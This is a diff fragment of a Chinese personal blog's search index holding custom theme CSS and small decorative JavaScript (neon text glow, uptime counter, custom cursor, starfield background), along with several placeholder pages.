+        <content type="html"><![CDATA[/* 页脚与头图透明 */#footer {    background: transparent !important;  }  #page-header {    background: transparent !important;  }    /* 白天模式遮罩透明 */  #footer::before {    background: transparent !important;  }  #page-header::before {    background: transparent !important;  }    /* 夜间模式遮罩透明 */  [data-theme="dark"] #footer::before {    background: transparent !important;  }  [data-theme="dark"] #page-header::before {    background: transparent !important;  }  /* 小冰分类分类磁铁黑夜模式适配 *//* 一般状态 */[data-theme="dark"] .magnet_link_context {  background: #1e1e1e;  color: antiquewhite;}/* 鼠标悬浮状态 */[data-theme="dark"] .magnet_link_context:hover {  background: #3ecdf1;  color: #f2f2f2;}/* 自定义字体 */@font-face {  /* 为载入的字体取名字(随意) */  font-family: 'YSHST';  /* 字体文件地址(相对或者绝对路径都可以) */  src: url(/font/优设好身体.woff2);  /* 定义加粗样式(加粗多少) */  font-weight: normal;  /* 定义字体样式(斜体/非斜体) */  font-style: normal;  /* 定义显示样式 */  font-display: block;}/* 翻页按钮居中 */#pagination {  width: 100%;  margin: auto;}/* 一级菜单居中 */#nav .menus_items {  position: absolute !important;  width: fit-content !important;  left: 50% !important;  transform: translateX(-50%) !important;}/* 子菜单横向展示 */#nav .menus_items .menus_item:hover .menus_item_child {  display: flex !important;}/* 这里的2是代表导航栏的第2个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(2) .menus_item_child {  left: -125px;}/* 夜间模式菜单栏发光字 */[data-theme="dark"] #nav .site-page,[data-theme="dark"] #nav .menus_items .menus_item .menus_item_child li a {  text-shadow: 0 0 2px rgb(87, 212, 125) !important;}/* 手机端适配 */[data-theme="dark"] #sidebar #sidebar-menus .menus_items .site-page {  text-shadow: 0 0 2px rgb(87, 212, 125) !important;}/* 背景宇宙星光  */#universe{  display: block;  position: fixed;  margin: 0;  padding: 0;  border: 0;  outline: 0;  left: 0;  top: 0;  width: 100%;  height: 100%;  pointer-events: none;  /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */  z-index: -1;}/* 侧边栏个人信息卡片动态渐变色 *//* #aside-content > .card-widget.card-info {  background: linear-gradient(    -45deg,    #e8d8b9,    #eccec5,    #a3e9eb,    #bdbdf0,    #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }} *//* 黑夜模式适配 *//* [data-theme="dark"] #aside-content > .card-widget.card-info {  background: #191919ee;} *//* 个人信息Follow me按钮 *//* #aside-content > .card-widget.card-info > #card-info-btn {  background-color: #3eb8be;  border-radius: 8px;} *//* 鼠标样式 */#cursor {  position: fixed;  width: 16px;  height: 16px;  /* 这里改变跟随的底色 */  background: rgb(66, 166, 224);  border-radius: 8px;  opacity: 0.25;  z-index: 10086;  pointer-events: none;  transition: 0.2s ease-in-out;  transition-property: background, opacity, transform;}#cursor.hidden {  opacity: 0;}#cursor.hover {  opacity: 0.1;  transform: scale(2.5);  -webkit-transform: scale(2.5);  -moz-transform: scale(2.5);  -ms-transform: scale(2.5);  -o-transform: scale(2.5);}#cursor.active {  opacity: 0.5;  transform: scale(0.5);  -webkit-transform: scale(0.5);  -moz-transform: scale(0.5);  -ms-transform: scale(0.5);  -o-transform: scale(0.5);}/* =====================页面样式调节=========================== */:root {  --trans-light: rgba(255, 255, 255, 0.88);  --trans-dark: rgba(25, 25, 25, 0.88);  --border-style: 1px solid rgb(169, 169, 169);  --backdrop-filter: blur(5px) saturate(150%);}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 25px;  border: var(--border-style);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border-radius: 18px;  border: var(--border-style);}/* 文章页、归档页、普通页面 */div#post,div#page,div#archive {  background: var(--trans-light);  backdrop-filter: var(--backdrop-filter);  border: var(--border-style);  border-radius: 20px;}/* 导航栏 */#page-header.nav-fixed #nav {  background: rgba(255, 255, 255, 0.75);  backdrop-filter: var(--backdrop-filter);}[data-theme="dark"] #page-header.nav-fixed #nav {  background: rgba(0, 0, 0, 0.7) !important;}/* 夜间模式遮罩 */[data-theme="dark"] #recent-posts > .recent-post-item,[data-theme="dark"] #aside-content .card-widget,[data-theme="dark"] div#post,[data-theme="dark"] div#archive,[data-theme="dark"] div#page {  background: var(--trans-dark);}/* 夜间模式页脚页头遮罩透明 */[data-theme="dark"] #footer::before {  background: transparent !important;}[data-theme="dark"] #page-header::before {  background: transparent !important;}/* 阅读模式 */.read-mode #aside-content .card-widget {  background: rgba(158, 204, 171, 0.5) !important;}.read-mode div#post {  background: rgba(158, 204, 171, 0.5) !important;}/* 夜间模式下的阅读模式 */[data-theme="dark"] .read-mode #aside-content .card-widget {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}[data-theme="dark"] .read-mode div#post {  background: rgba(25, 25, 25, 0.9) !important;  color: #ffffff;}]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/light.js"/>
+      <url>/js/light.js</url>
+      
+        <content type="html"><![CDATA[// 霓虹灯效果// 颜色数组var arr = ["#39c5bb", "#f14747", "#f1a247", "#f1ee47", "#b347f1", "#1edbff", "#ed709b", "#5636ed"];// 颜色索引var idx = 0;// 切换颜色function changeColor() {    // 仅夜间模式才启用    if (document.getElementsByTagName('html')[0].getAttribute('data-theme') == 'dark') {        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = arr[idx] + " 0 0 15px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = arr[idx] + " 0 0 10px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = arr[idx] + " 0 0 5px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = arr[idx] + " 0 0 12px";            document.getElementsByClassName("author-info__description")[0].style.textShadow = arr[idx] + " 0 0 12px";        } catch {                    }        idx++;        if (idx == 8) {            idx = 0;        }    } else {        // 白天模式恢复默认        if (document.getElementById("site-name"))            document.getElementById("site-name").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-title"))            document.getElementById("site-title").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("site-subtitle"))            document.getElementById("site-subtitle").style.textShadow = "#1e1e1ee0 1px 1px 1px";        if (document.getElementById("post-info"))            document.getElementById("post-info").style.textShadow = "#1e1e1ee0 1px 1px 1px";        try {            document.getElementsByClassName("author-info__name")[0].style.textShadow = "";            document.getElementsByClassName("author-info__description")[0].style.textShadow = "";        } catch {                    }    }}// 开启计时器window.onload = setInterval(changeColor, 1200);]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/runtime.js"/>
+      <url>/js/runtime.js</url>
+      
+        <content type="html"><![CDATA[var now = new Date;function createtime() {    now.setTime(now.getTime() + 1e3);    var e = new Date("11/19/2022 00:00:00"),        t = Math.trunc(234e8 + (now - e) / 1e3 * 17),        a = (t / 1496e5).toFixed(6),        r = new Date("11/26/2022 00:00:00"),        o = (now - r) / 1e3 / 60 / 60 / 24,        i = Math.floor(o),        n = (now - r) / 1e3 / 60 / 60 - 24 * i,        s = Math.floor(n);    1 == String(s).length && (s = "0" + s);    var l = (now - r) / 1e3 / 60 - 1440 * i - 60 * s,        g = Math.floor(l);    1 == String(g).length && (g = "0" + g);    var d = (now - r) / 1e3 - 86400 * i - 3600 * s - 60 * g,        c = Math.round(d);    1 == String(c).length && (c = "0" + c);    let h = "";    h = s < 18 && s >= 9 ? `<img class='boardsign' src='https://img.shields.io/badge/F小屋-上班摸鱼中-6adea8?style=social&logo=cakephp' title='距离月入25k也就还差一个大佬带我~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${c} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 再看看那个光点，它就在这里，这是家园，这是我们 —— 你所爱的每一个人，你认识的一个人，你听说过的每一个人，曾经有过的每一个人，都在它上面度过他们的一生✨ ` : `<img class='boardsign' src='https://img.shields.io/badge/F小屋-打烊休息啦-6adea8?style=social&logo=coffeescript' title='今天一定早睡~'><br> 本站居然运行了 ${i} 天 ${s} 小时 ${g} 分 ${c} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀 <br> 我不怕死亡，唯独惧怕失去思考✨ `, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = h)}setInterval((() => {    createtime()}), 1e3);]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/cursor.js"/>
+      <url>/js/cursor.js</url>
+      
+        <content type="html"><![CDATA[var CURSOR;Math.lerp = (a, b, n) => (1 - n) * a + n * b;const getStyle = (el, attr) => {    try {        return window.getComputedStyle            ? window.getComputedStyle(el)[attr]            : el.currentStyle[attr];    } catch (e) {}    return "";};class Cursor {    constructor() {        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    move(left, top) {        this.cursor.style["left"] = `${left}px`;        this.cursor.style["top"] = `${top}px`;    }    create() {        if (!this.cursor) {            this.cursor = document.createElement("div");            this.cursor.id = "cursor";            this.cursor.classList.add("hidden");            document.body.append(this.cursor);        }        var el = document.getElementsByTagName('*');        for (let i = 0; i < el.length; i++)            if (getStyle(el[i], "cursor") == "pointer")                this.pt.push(el[i].outerHTML);        document.body.appendChild((this.scr = document.createElement("style")));        // 这里改变鼠标指针的颜色 由svg生成        this.scr.innerHTML = `* {cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'><circle cx='4' cy='4' r='4' opacity='1.0' fill='rgb(66, 166, 224)'/></svg>") 4 4, auto}`;    }    refresh() {        this.scr.remove();        this.cursor.classList.remove("hover");        this.cursor.classList.remove("active");        this.pos = {curr: null, prev: null};        this.pt = [];        this.create();        this.init();        this.render();    }    init() {        document.onmouseover  = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.add("hover");        document.onmouseout   = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.remove("hover");        document.onmousemove  = e => {(this.pos.curr == null) && this.move(e.clientX - 8, e.clientY - 8); this.pos.curr = {x: e.clientX - 8, y: e.clientY - 8}; this.cursor.classList.remove("hidden");};        document.onmouseenter = e => this.cursor.classList.remove("hidden");        document.onmouseleave = e => this.cursor.classList.add("hidden");        document.onmousedown  = e => this.cursor.classList.add("active");        document.onmouseup    = e => this.cursor.classList.remove("active");    }    render() {        if (this.pos.prev) {            this.pos.prev.x = Math.lerp(this.pos.prev.x, this.pos.curr.x, 0.15);            this.pos.prev.y = Math.lerp(this.pos.prev.y, this.pos.curr.y, 0.15);            this.move(this.pos.prev.x, this.pos.prev.y);        } else {            this.pos.prev = this.pos.curr;        }        requestAnimationFrame(() => this.render());    }}(() => {    CURSOR = new Cursor();    // 需要重新获取列表时，使用 CURSOR.refresh()})();]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/js/universe.js"/>
+      <url>/js/universe.js</url>
+      
+        <content type="html"><![CDATA[function dark() {window.requestAnimationFrame=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame;var n,e,i,h,t=.05,s=document.getElementById("universe"),o=!0,a="180,184,240",r="226,225,142",d="226,225,224",c=[];function f(){n=window.innerWidth,e=window.innerHeight,i=.216*n,s.setAttribute("width",n),s.setAttribute("height",e)}function u(){h.clearRect(0,0,n,e);for(var t=c.length,i=0;i<t;i++){var s=c[i];s.move(),s.fadeIn(),s.fadeOut(),s.draw()}}function y(){this.reset=function(){this.giant=m(3),this.comet=!this.giant&&!o&&m(10),this.x=l(0,n-10),this.y=l(0,e),this.r=l(1.1,2.6),this.dx=l(t,6*t)+(this.comet+1-1)*t*l(50,120)+2*t,this.dy=-l(t,6*t)-(this.comet+1-1)*t*l(50,120),this.fadingOut=null,this.fadingIn=!0,this.opacity=0,this.opacityTresh=l(.2,1-.4*(this.comet+1-1)),this.do=l(5e-4,.002)+.001*(this.comet+1-1)},this.fadeIn=function(){this.fadingIn&&(this.fadingIn=!(this.opacity>this.opacityTresh),this.opacity+=this.do)},this.fadeOut=function(){this.fadingOut&&(this.fadingOut=!(this.opacity<0),this.opacity-=this.do/2,(this.x>n||this.y<0)&&(this.fadingOut=!1,this.reset()))},this.draw=function(){if(h.beginPath(),this.giant)h.fillStyle="rgba("+a+","+this.opacity+")",h.arc(this.x,this.y,2,0,2*Math.PI,!1);else if(this.comet){h.fillStyle="rgba("+d+","+this.opacity+")",h.arc(this.x,this.y,1.5,0,2*Math.PI,!1);for(var t=0;t<30;t++)h.fillStyle="rgba("+d+","+(this.opacity-this.opacity/20*t)+")",h.rect(this.x-this.dx/4*t,this.y-this.dy/4*t-2,2,2),h.fill()}else h.fillStyle="rgba("+r+","+this.opacity+")",h.rect(this.x,this.y,this.r,this.r);h.closePath(),h.fill()},this.move=function(){this.x+=this.dx,this.y+=this.dy,!1===this.fadingOut&&this.reset(),(this.x>n-n/4||this.y<0)&&(this.fadingOut=!0)},setTimeout(function(){o=!1},50)}function m(t){return Math.floor(1e3*Math.random())+1<10*t}function l(t,i){return Math.random()*(i-t)+t}f(),window.addEventListener("resize",f,!1),function(){h=s.getContext("2d");for(var t=0;t<i;t++)c[t]=new y,c[t].reset();u()}(),function t(){document.getElementsByTagName('html')[0].getAttribute('data-theme')=='dark'&&u(),window.requestAnimationFrame(t)}()};dark()]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>标签</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>音乐</title>
+      <link href="/music/index.html"/>
+      <url>/music/index.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="暂时下线"><a href="#暂时下线" class="headerlink" title="暂时下线"></a>暂时下线</h2><!-- ## QQ音乐歌单 --><!-- <div id="aplayer-oSEOhviA" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="8708383891" data-server="tencent" data-type="playlist" data-mode="random" data-autoplay="false" data-listmaxheight="340px" data-preload="auto" data-theme="#e3f2f5" data-volume="0.4" mutex="true"></div> -->]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电影</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="天太冷了，冻死了，天气暖和再做这块"><a href="#天太冷了，冻死了，天气暖和再做这块" class="headerlink" title="天太冷了，冻死了，天气暖和再做这块"></a>天太冷了，冻死了，天气暖和再做这块</h2>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>友链</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+  
+</search>
